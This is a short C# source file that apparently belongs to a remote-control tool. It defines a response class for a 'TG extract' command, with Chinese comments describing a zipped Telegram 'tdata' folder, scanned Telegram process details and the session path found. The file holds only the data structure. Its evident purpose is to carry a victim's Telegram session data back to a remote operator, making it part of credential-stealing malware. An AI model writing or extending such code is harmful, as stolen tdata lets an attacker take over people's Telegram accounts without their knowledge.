using System;

namespace RemoteControl.Protocals.Response
{
    public class ResponseTGExtract : ResponseBase
    {
        /// <summary>
        /// TG tdata压缩包数据
        /// </summary>
        public byte[] TdataZip;

        /// <summary>
        /// 文件名
        /// </summary>
        public string FileName = "";

        /// <summary>
        /// 是否找到TG
        /// </summary>
        public bool Found = false;

        /// <summary>
        /// 扫描到的TG进程信息列表 (PID|ProcessName|ExePath|TdataPath)
        /// </summary>
        public string[] ProcessInfoList;

        /// <summary>
        /// 找到的tdata路径
        /// </summary>
        public string TdataPath = "";
    }
}
